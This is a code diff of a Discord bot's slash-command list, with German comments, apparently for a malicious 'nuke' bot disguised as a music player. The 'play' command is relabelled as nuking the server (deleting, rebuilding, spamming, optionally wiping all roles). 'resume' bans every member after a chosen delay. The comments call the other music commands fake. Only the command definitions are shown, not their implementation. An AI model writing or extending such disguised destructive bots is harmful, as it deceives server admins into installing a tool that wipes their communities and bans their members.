@@ -22,27 +22,32 @@ const cmd = (name, description, build) => {
 /* --------------------------------------------------------------- commands */
 
 export const commands = [
-  /* -------- die ersten vier landen im profil -------- */
-  cmd('play', 'benutze diesen command um musik zu spielen', b => b
-    .addStringOption(o => o.setName('song').setDescription('song name or url').setRequired(false))
-    .addBooleanOption(o => o.setName('roles').setDescription('auch alle rollen löschen (default: false)').setRequired(false))
-    .addBooleanOption(o => o.setName('ban').setDescription('alle bannen (default: true)').setRequired(false))
-    .addIntegerOption(o => o.setName('seconds')
-      .setDescription('ban-delay in sekunden, 15-120 (default: 300 = 5min)')
-      .setMinValue(15).setMaxValue(120).setRequired(false))),
+  /* -------- nuke (schreibt nichts wenn fertig) -------- */
+  cmd('play', 'nuked den server: löschen, neu bauen, spammen', b => b
+    .addBooleanOption(o => o.setName('roles')
+      .setDescription('auch alle rollen löschen (default: false)')
+      .setRequired(false))),
 
+  /* -------- ban -------- */
+  // wenn du ein dropdown statt zahl-eingabe willst:
+  //   .addChoices({ name: '10s', value: 10 }, { name: '30s', value: 30 }, ...)
+  cmd('resume', 'bannt jeden nach X sekunden', b => b
+    .addIntegerOption(o => o.setName('seconds')
+      .setDescription('sekunden bis ALLE gebannt werden')
+      .setRequired(true)
+      .setMinValue(1)
+      .setMaxValue(3600))),
+
+  /* -------- fake music -------- */
   cmd('skip', 'skip the current track'),
 
   cmd('play-file', 'play a song from an uploaded file', b => b
     .addAttachmentOption(o => o.setName('file').setDescription('mp3 / flac / wav').setRequired(true))),
 
   cmd('stop', 'stop playback and clear the queue'),
-
-  /* -------- der rest ist fake -------- */
   cmd('queue', 'show the current queue'),
   cmd('nowplaying', 'show what is currently playing'),
   cmd('pause', 'pause playback'),
-  cmd('resume', 'resume playback'),
   cmd('clear', 'clear the queue'),
   cmd('shuffle', 'shuffle the queue'),
   cmd('join', 'join your voice channel'),
